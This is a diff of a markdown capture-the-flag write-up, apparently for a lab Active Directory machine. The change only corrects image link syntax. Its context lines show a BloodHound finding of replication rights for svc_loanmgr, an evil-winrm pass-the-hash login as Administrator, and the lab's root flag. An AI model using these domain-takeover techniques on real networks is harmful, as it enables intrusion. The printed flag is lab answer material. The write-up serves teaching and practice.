@@ -250,7 +250,7 @@ bloodhound-python -u 'svc_loanmgr' \
 ```
 
 Imported into BloodHound and searched for `svc_loanmgr`. Going through the information about the account, I saw it has an Outbound control over an object. "THE DOMAIN" itself. This revealed the attack path:
-[!Bloodhound](/assets/images/ego7.png)
+![Bloodhound](/assets/images/ego7.png)
 ```
 SVC_LOANMGR → GetChanges → EGOTISTICAL-BANK.LOCAL
 SVC_LOANMGR → GetChangesAll → EGOTISTICAL-BANK.LOCAL
@@ -294,7 +294,7 @@ evil-winrm -i 10.129.95.180 -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 7bbb58e44da965eab7b941afb199254a
 ```
-[!Root](/assets/images/ego8.png)
+![Root](/assets/images/ego8.png)
 
 **Root Flag:** `7bbb58e44da965eab7b941afb199254a` ✅
 
